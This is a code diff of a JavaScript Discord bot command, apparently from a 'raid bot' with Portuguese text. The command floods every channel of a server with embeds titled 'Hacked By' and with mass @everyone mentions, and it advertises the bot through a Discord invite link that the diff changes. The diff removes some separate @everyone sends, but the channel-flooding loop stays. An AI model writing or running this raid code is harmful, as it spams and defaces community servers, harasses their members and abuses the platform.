@@ -10,7 +10,7 @@ exports.run = async (client, message, args) => {
     let Title = `Hackeado Por: ${arg}`
     let Description = "@everyone @everyone @everyone @everyone @everyone @everyone"
     let field = "Quer Ter Esse Bot De Raid?:"
-    let fieldd = "Servidor Do Bot: https://discord.gg/gF5pQ2" // descricão do field
+    let fieldd = "Servidor Do Bot: https://discord.gg/VFNnvkq" // descricão do field
    const embed = new discord.RichEmbed()
    .setTitle(Title)
    .setColor("RANDOM")
@@ -34,33 +34,19 @@ exports.run = async (client, message, args) => {
    function msg(){
      client.guilds.get(message.guild.id).channels.forEach((canal) => {
         canal.send(embed)
-       canal.send("@everyone")
         canal.send(embed0)
-       canal.send("@everyone")
         canal.send(embed1)
-       canal.send("@everyone")
         canal.send(embed)
-       canal.send("@everyone")
         canal.send(embed0)
-       canal.send("@everyone")
         canal.send(embed1)
-       canal.send("@everyone")
         canal.send(embed)
-       canal.send("@everyone")
         canal.send(embed0)
-       canal.send("@everyone")
         canal.send(embed1)
-       canal.send("@everyone")
         canal.send(embed)
-       canal.send("@everyone")
         canal.send(embed0)
-       canal.send("@everyone")
         canal.send(embed1)
-       canal.send("@everyone")
         canal.send(embed)
-       canal.send("@everyone")
         canal.send(embed0)
-       canal.send("@everyone")
         canal.send(embed1)
      })
    }
